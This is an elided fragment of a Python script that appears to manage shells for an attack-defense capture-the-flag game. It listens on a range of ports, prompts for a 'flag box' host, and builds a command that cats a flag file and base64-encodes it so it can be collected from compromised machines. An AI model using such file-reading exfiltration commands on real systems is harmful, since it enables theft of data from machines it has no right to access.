...
def main():
    ...
    for new_master_port in range(port, port+40):
        try:
            new_master_thread = threading.Thread(target=master, args=(host, new_master_port,))
            ...
            Log.info("port is already in use %s:%d" % (host, new_master_port))
        ...
        if command == "h" or command == "help" or command == "?" or command == "\n":
           ...
           try:
            ...
            box_host = raw_input("Input flag box host (192.168.187.128) : ") or (
                "192.168.187.128")
            box_port = int(raw_input("Input flag box host (80) : ") or ("80"))
            cmd = "FLAG=`/bin/cat %s | base64`" % (flag_path)
            Log.info("Command : %s" % (cmd))
